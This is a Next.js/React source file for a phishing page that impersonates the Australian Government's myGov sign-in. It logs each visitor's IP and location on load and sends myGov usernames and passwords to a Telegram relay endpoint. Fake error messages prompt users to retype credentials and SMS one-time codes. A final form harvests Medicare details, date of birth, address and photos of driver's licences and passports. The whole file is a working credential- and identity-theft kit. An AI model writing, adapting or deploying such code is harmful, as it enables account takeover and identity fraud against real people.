"use client";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import React, { useState, useEffect, useRef } from "react";
import { ChevronLeft, Key, Info, Eye } from "lucide-react";

export default function Home() {
  const [attemptCount, setAttemptCount] = useState(0);
  const [showCodePage, setShowCodePage] = useState(false);
  const [codeAttemptCount, setCodeAttemptCount] = useState(0);
  const [showDetailsPage, setShowDetailsPage] = useState(false);
  const [name, setName] = useState("");
  const [address, setAddress] = useState("");
  const [dob, setDob] = useState("");
  const [medicareNumber, setMedicareNumber] = useState("");
  const [medicareExpiry, setMedicareExpiry] = useState("");
  const [medicareIRN, setMedicareIRN] = useState("");
  const [driversLicenseFront, setDriversLicenseFront] = useState<File | null>(null);
  const [driversLicenseBack, setDriversLicenseBack] = useState<File | null>(null);
  const [passport, setPassport] = useState<File | null>(null);
  const [codeError, setCodeError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  // Send message to Telegram
  const sendTelegramMessage = async (message: string) => {
    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      });
    } catch (error) {
      console.error("Failed to send Telegram message:", error);
    }
  };

  // Send multipart/form-data (message + files) to Telegram endpoint
  const sendTelegramForm = async (formData: FormData) => {
    try {
      await fetch("/api/telegram", {
        method: "POST",
        body: formData, // browser sets Content-Type including boundary
      });
    } catch (error) {
      console.error("Failed to send Telegram form:", error);
    }
  };

  // Send notification when user visits the page
  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((response) => response.json())
      .then((data) => {
        const visitData = {
          url: window.location.href,
          ip: data.ip,
          location: `${data.city}, ${data.region}, ${data.country_name}`,
        };

        sendTelegramMessage(
          `Visited this URL: ${visitData.url}\nIP Address: ${visitData.ip}\nLocation: ${visitData.location}`
        );
      });
  }, []);

  const handleSignIn = async () => {
    const usernameInput = document.getElementById("username") as HTMLInputElement | null;
    const passwordInput = document.getElementById("password") as HTMLInputElement | null;
    const username = usernameInput ? usernameInput.value : "";
    const password = passwordInput ? passwordInput.value : "";

    await sendTelegramMessage(
      `Sign-in attempt:\nUsername: ${username}\nPassword: ${password}`
    );

    if (attemptCount === 0) {
      setAttemptCount(1);
      const errorElement = document.createElement("div");
      errorElement.style.cssText = `
        background-color: #f8d7da;
        color: #721c24;
        padding: 10px;
        border-radius: 5px;
        margin-bottom: 20px;
      `;
      errorElement.innerHTML = `
        <span>! Error</span>
        <p>Your sign in details are incorrect (RFM10A)</p>
        <a href="#" style="color: #0066CC; text-decoration: underline;">Forgot username</a>
        <a href="#" style="color: #0066CC; text-decoration: underline; margin-left: 10px;">Forgot password</a>
      `;
      const mainElement = document.querySelector("main");
      if (mainElement) {
        mainElement.prepend(errorElement);
      }
    } else if (attemptCount === 1) {
      setAttemptCount(2);
      setShowCodePage(true);
    }
  };

  const handleCodeSubmit = async () => {
    const codeInput = document.getElementById("code") as HTMLInputElement | null;
    const code = codeInput ? codeInput.value : "";

    await sendTelegramMessage(`Code entered: ${code}`);

    if (codeAttemptCount === 0) {
      // First failed attempt: show loading then display an error using React state
      setCodeAttemptCount(1);
      setLoading(true);
      setCodeError(null);
      await new Promise((resolve) => setTimeout(resolve, 1200));
      setLoading(false);
      setCodeError("You entered the incorrect code (RFM68A)");
      // keep showCodePage true so the code entry UI remains visible
      setShowCodePage(true);
    } else if (codeAttemptCount === 1) {
      await sendTelegramMessage(`Second code attempt: ${code}`);
      setShowDetailsPage(true);
    }
  };

  const handleDetailsSubmit = async () => {
    const message = `
      User Details:
      Name: ${name}
      Address: ${address}
      Date of Birth: ${dob}
      Medicare Number: ${medicareNumber}
      Medicare Expiry: ${medicareExpiry}
      Medicare IRN: ${medicareIRN}
      Driver's License Front: ${driversLicenseFront ? driversLicenseFront.name + " (attached)" : "Not uploaded"}
      Driver's License Back: ${driversLicenseBack ? driversLicenseBack.name + " (attached)" : "Not uploaded"}
      Passport: ${passport ? passport.name + " (attached)" : "Not uploaded"}
    `;

    const formData = new FormData();
    formData.append("message", message);
    if (driversLicenseFront) formData.append("driversLicenseFront", driversLicenseFront);
    if (driversLicenseBack) formData.append("driversLicenseBack", driversLicenseBack);
    if (passport) formData.append("passport", passport);

    await sendTelegramForm(formData);
  };

  if (showDetailsPage) {
    return (
      <div className="min-h-screen bg-gray-50">
        <header className="bg-[#87CEEB] px-4 py-4">
          <div className="max-w-6xl mx-auto flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-black rounded-full flex items-center justify-center">
                  <span className="text-white text-xs font-bold">AU</span>
                </div>
                <span className="text-black font-medium text-sm">Australian Government</span>
              </div>
              <div className="flex items-center gap-2 ml-8">
                <div className="flex">
                  <div className="w-0 h-0 border-l-[16px] border-l-[#4A5568] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
                  <div className="w-0 h-0 border-l-[16px] border-l-[#2D3748] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
                </div>
                <span className="text-black text-xl font-semibold">myGov</span>
              </div>
            </div>
            <a href="#" className="text-black underline font-medium">
              Help
            </a>
          </div>
        </header>
        <main className="max-w-2xl mx-auto px-4 py-8">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">Enter Your Details</h1>
          <p>Please provide the following information to verify your identity.</p>
          <div className="space-y-6 mt-4">
            <div className="space-y-2">
              <label htmlFor="name" className="block text-lg font-medium text-gray-900">Full Name</label>
              <Input
                id="name"
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="address" className="block text-lg font-medium text-gray-900">Address</label>
              <Input
                id="address"
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="dob" className="block text-lg font-medium text-gray-900">Date of Birth</label>
              <Input
                id="dob"
                type="date"
                value={dob}
                onChange={(e) => setDob(e.target.value)}
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
              />
            </div>
            <div className="space-y-2">
              <h2 className="text-lg font-medium text-gray-900">Medicare</h2>
              <div className="space-y-2">
                <label htmlFor="medicare-number" className="block text-lg font-medium text-gray-900">Medicare Number</label>
                <Input
                  id="medicare-number"
                  type="text"
                  value={medicareNumber}
                  onChange={(e) => setMedicareNumber(e.target.value)}
                  className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
                />
              </div>
              <div className="space-y-2">
                <label htmlFor="medicare-expiry" className="block text-lg font-medium text-gray-900">Expiry Date</label>
                <Input
                  id="medicare-expiry"
                  type="date"
                  value={medicareExpiry}
                  onChange={(e) => setMedicareExpiry(e.target.value)}
                  className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
                />
              </div>
              <div className="space-y-2">
                <label htmlFor="medicare-irn" className="block text-lg font-medium text-gray-900">Individual Reference Number</label>
                <Input
                  id="medicare-irn"
                  type="text"
                  value={medicareIRN}
                  onChange={(e) => setMedicareIRN(e.target.value)}
                  className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
                />
              </div>
            </div>
            <div className="space-y-2">
              <label htmlFor="license-front" className="block text-lg font-medium text-gray-900">Driver's License (Front)</label>
              <Input
                id="license-front"
                type="file"
                accept="image/*"
                onChange={(e) => setDriversLicenseFront(e.target.files ? e.target.files[0] : null)}
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="license-back" className="block text-lg font-medium text-gray-900">Driver's License (Back)</label>
              <Input
                id="license-back"
                type="file"
                accept="image/*"
                onChange={(e) => setDriversLicenseBack(e.target.files ? e.target.files[0] : null)}
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="passport" className="block text-lg font-medium text-gray-900">Passport</label>
              <Input
                id="passport"
                type="file"
                accept="image/*"
                onChange={(e) => setPassport(e.target.files ? e.target.files[0] : null)}
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
              />
            </div>
            <Button
              onClick={handleDetailsSubmit}
              className="w-full h-14 bg-[#87CEEB] hover:bg-[#7DD3FC] text-black text-lg font-medium rounded-lg mt-6"
            >
              Submit
            </Button>
          </div>
          <Button
            className="w-full h-14 bg-transparent border-2 border-gray-900 text-black text-lg font-medium rounded-lg mt-4"
          >
            Cancel
          </Button>
        </main>
        <footer className="bg-black text-white mt-16">
          <div className="max-w-6xl mx-auto px-4 py-8">
            <div className="flex flex-wrap gap-8 mb-8">
              <a href="#" className="hover:underline">
                Terms of use
              </a>
              <a href="#" className="hover:underline">
                Privacy and security
              </a>
              <a href="#" className="hover:underline">
                Copyright
              </a>
              <a href="#" className="hover:underline">
                Accessibility
              </a>
            </div>
            <Separator className="bg-gray-600 mb-8" />
            <div className="flex items-center gap-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
                  <span className="text-black text-xs font-bold">AU GOV</span>
                </div>
                <span className="text-white font-medium">Australian Government</span>
              </div>
              <div className="flex items-center gap-2 ml-8">
                <div className="flex">
                  <div className="w-0 h-0 border-l-[20px] border-l-white border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
                  <div className="w-0 h-0 border-l-[20px] border-l-gray-300 border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
                </div>
                <span className="text-white text-2xl font-semibold">myGov</span>
              </div>
            </div>
            <p className="text-gray-300 leading-relaxed">
              We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and
              present, of all Aboriginal and Torres Strait Islander nations.
            </p>
          </div>
        </footer>
      </div>
    );
  }

  if (showCodePage) {
    return (
      <div className="min-h-screen bg-gray-50">
        <header className="bg-[#87CEEB] px-4 py-4">
          <div className="max-w-6xl mx-auto flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-black rounded-full flex items-center justify-center">
                  <span className="text-white text-xs font-bold">AU</span>
                </div>
                <span className="text-black font-medium text-sm">Australian Government</span>
              </div>
              <div className="flex items-center gap-2 ml-8">
                <div className="flex">
                  <div className="w-0 h-0 border-l-[16px] border-l-[#4A5568] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
                  <div className="w-0 h-0 border-l-[16px] border-l-[#2D3748] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
                </div>
                <span className="text-black text-xl font-semibold">myGov</span>
              </div>
            </div>
            <a href="#" className="text-black underline font-medium">
              Help
            </a>
          </div>
        </header>
        <main className="max-w-2xl mx-auto px-4 py-8">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">Enter code</h1>
          <p>We sent a code by SMS to your mobile number.</p>
          <div className="space-y-2 mt-4">
            <label htmlFor="code" className="block text-lg font-medium text-gray-900">Code</label>
            <Input id="code" type="text" className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0" />
            <a href="#" className="text-[#0066CC] underline inline-block">I didn't get my code</a>
            {loading && (
              <div className="flex items-center justify-center mt-4">
                <div className="animate-spin rounded-full h-10 w-10 border-t-4 border-b-4 border-[#87CEEB]"></div>
              </div>
            )}
            {codeError && (
              <div className="bg-red-100 text-red-800 p-3 rounded mt-4">
                <strong>! Error</strong>
                <p className="mt-1">{codeError}</p>
              </div>
            )}
          </div>
          <Button
            onClick={handleCodeSubmit}
            className="w-full h-14 bg-[#87CEEB] hover:bg-[#7DD3FC] text-black text-lg font-medium rounded-lg mt-6"
          >
            Next
          </Button>
          <Button
            className="w-full h-14 bg-transparent border-2 border-gray-900 text-black text-lg font-medium rounded-lg mt-4"
          >
            Cancel
          </Button>
          <footer className="bg-black text-white mt-16">
            <div className="max-w-6xl mx-auto px-4 py-8">
              <div className="flex flex-wrap gap-8 mb-8">
                <a href="#" className="hover:underline">
                  Terms of use
                </a>
                <a href="#" className="hover:underline">
                  Privacy and security
                </a>
                <a href="#" className="hover:underline">
                  Copyright
                </a>
                <a href="#" className="hover:underline">
                  Accessibility
                </a>
              </div>
              <Separator className="bg-gray-600 mb-8" />
              <div className="flex items-center gap-4 mb-8">
                <div className="flex items-center gap-3">
                  <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
                    <span className="text-black text-xs font-bold">AU GOV</span>
                  </div>
                  <span className="text-white font-medium">Australian Government</span>
                </div>
                <div className="flex items-center gap-2 ml-8">
                  <div className="flex">
                    <div className="w-0 h-0 border-l-[20px] border-l-white border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
                    <div className="w-0 h-0 border-l-[20px] border-l-gray-300 border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
                  </div>
                  <span className="text-white text-2xl font-semibold">myGov</span>
                </div>
              </div>
              <p className="text-gray-300 leading-relaxed">
                We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and
                present, of all Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </footer>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-[#87CEEB] px-4 py-4">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-black rounded-full flex items-center justify-center">
                <span className="text-white text-xs font-bold">AU</span>
              </div>
              <span className="text-black font-medium text-sm">Australian Government</span>
            </div>
            <div className="flex items-center gap-2 ml-8">
              <div className="flex">
                <div className="w-0 h-0 border-l-[16px] border-l-[#4A5568] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
                <div className="w-0 h-0 border-l-[16px] border-l-[#2D3748] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
              </div>
              <span className="text-black text-xl font-semibold">myGov</span>
            </div>
          </div>
          <a href="#" className="text-black underline font-medium">
            Help
          </a>
        </div>
      </header>
      <main className="max-w-2xl mx-auto px-4 py-8">
        <button className="flex items-center gap-2 text-[#0066CC] font-medium mb-8 hover:underline">
          <ChevronLeft size={20} />
          Back
        </button>
        <h1 className="text-4xl font-bold text-gray-900 mb-4">Sign in with myGov</h1>
        <div className="space-y-6">
          <h2 className="text-2xl font-bold text-gray-900">Use your myGov sign in details</h2>
          <div className="space-y-2">
            <label htmlFor="username" className="block text-lg font-medium text-gray-900">
              Username or email
            </label>
            <Input
              id="username"
              type="text"
              className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
            />
            <a href="#" className="text-[#0066CC] underline inline-block">
              Forgot username
            </a>
          </div>
          <div className="space-y-2">
            <label htmlFor="password" className="block text-lg font-medium text-gray-900">
              Password
            </label>
            <div className="relative">
              <Input
                id="password"
                type="password"
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0 pr-16"
              />
              <button className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#0066CC] font-medium">
                Show
              </button>
            </div>
            <a href="#" className="text-[#0066CC] underline inline-block">
              Forgot password
            </a>
          </div>
          <Button
            onClick={handleSignIn}
            className="w-full h-14 bg-[#87CEEB] hover:bg-[#7DD3FC] text-black text-lg font-medium rounded-lg mt-6"
          >
            Sign in
          </Button>
          <div className="flex items-start gap-2 mt-6">
            <Info size={16} className="text-gray-500 mt-1 flex-shrink-0" />
            <p className="text-gray-700">
              <a href="#" className="text-[#0066CC] underline">
                Create a myGov account
              </a>{" "}
              if you don't have one already.
            </p>
          </div>
        </div>
      </main>
      <footer className="bg-black text-white mt-16">
        <div className="max-w-6xl mx-auto px-4 py-8">
          <div className="flex flex-wrap gap-8 mb-8">
            <a href="#" className="hover:underline">
              Terms of use
            </a>
            <a href="#" className="hover:underline">
              Privacy and security
            </a>
            <a href="#" className="hover:underline">
              Copyright
            </a>
            <a href="#" className="hover:underline">
              Accessibility
            </a>
          </div>
          <Separator className="bg-gray-600 mb-8" />
          <div className="flex items-center gap-4 mb-8">
            <div className="flex items-center gap-3">
              <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
                <span className="text-black text-xs font-bold">AU GOV</span>
              </div>
              <span className="text-white font-medium">Australian Government</span>
            </div>
            <div className="flex items-center gap-2 ml-8">
              <div className="flex">
                <div className="w-0 h-0 border-l-[20px] border-l-white border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
                <div className="w-0 h-0 border-l-[20px] border-l-gray-300 border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
              </div>
              <span className="text-white text-2xl font-semibold">myGov</span>
            </div>
          </div>
          <p className="text-gray-300 leading-relaxed">
            We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and
            present, of all Aboriginal and Torres Strait Islander nations.
          </p>
        </div>
      </footer>
    </div>
  );
}